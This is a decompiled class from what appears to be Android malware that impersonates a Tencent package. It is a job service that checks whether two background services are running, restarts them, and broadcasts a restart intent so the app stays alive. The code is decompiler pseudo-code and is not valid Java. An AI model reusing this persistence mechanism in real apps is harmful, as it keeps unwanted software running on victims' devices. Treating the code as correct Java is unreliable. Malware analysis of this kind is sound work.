package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: PersistentJobService
 * Original: Lcom/tencent/chesterddecoriamountsi22;
 */
public class PersistentJobService extends JobService {

    // === FIELDS ===
    private int JobId;

    // === METHODS ===

    public void Constructor() {
        // new JobService()
        v0 = 100;
        v1.JobId = 100;
        return;
    }

    private boolean isServiceWork(Context param0, String param1) {
        v0 = "activity";
        v3 = v3.getSystemService("activity");
        v3 = (ActivityManager) v3;
        v0 = 100;
        v0 = v3.getRunningServices(100);
        v0 = 0;
        if (v3 != null && v3 != 0) { // goto +3
        return 0;
        v3.iterator();
        v3.hasNext();
        if (v1 == null || v1 == 0) { // goto +22
        v1 = v3.next();
        v1 = (ActivityManager$RunningServiceInfo) v1;
        v1 = v1.service;
        v1.getClassName();
        v3 = v1.equals(v4);
        if (v1 == null || v1 == 0) { // goto +-22
        v3 = 1;
        return 1;
        return 0;
    }

    public int onStartCommand(Intent param0, int param1, int param2) {
        v1 = new Intent();
        v3 = v0.getApplicationContext();
        v3 = RestartSensorReceiver.class;
        // new Intent(v2, v3)
        v2 = "RestartSensor";
        v1 = v1.setAction("RestartSensor");
        v0.sendBroadcast(v1);
        v1 = 1;
        return 1;
    }

    public boolean onStartJob(JobParameters param0) {
        v4 = 0;
        v0 = PersistentService.class;
        v0.getName();
        v0 = v3.isServiceWork(v3, v0);
        if (v0 != null && v0 != 0) { // goto +12
        v0 = new Intent();
        v1 = PersistentService.class;
        // new Intent(v3, v1)
        v3.startService(v0);
        v0 = MainBackgroundService.class;
        v0.getName();
        v0 = v3.isServiceWork(v3, v0);
        if (v0 != null && v0 != 0) { // goto +62
        v0 = new Intent();
        v1 = MainBackgroundService.class;
        // new Intent(v3, v1)
        v3.startService(v0);
        // goto (branch)
        v0 = 1;
        Boolean.valueOf(1);
        1.booleanValue();
        if (v1 == null || v1 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1.booleanValue();
        if (v1 == null || v1 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1.booleanValue();
        if (v1 == null || v1 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1.booleanValue();
        if (1 == null || 1 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        v2 = v3.getApplicationContext();
        v2 = RestartSensorReceiver.class;
        // new Intent(v1, v2)
        v1 = "RestartSensor";
        1.setAction("RestartSensor");
        v3.sendBroadcast(1);
        return 0;
    }

    public boolean onStopJob(JobParameters param0) {
        v1 = 0;
        return 0;
    }
}
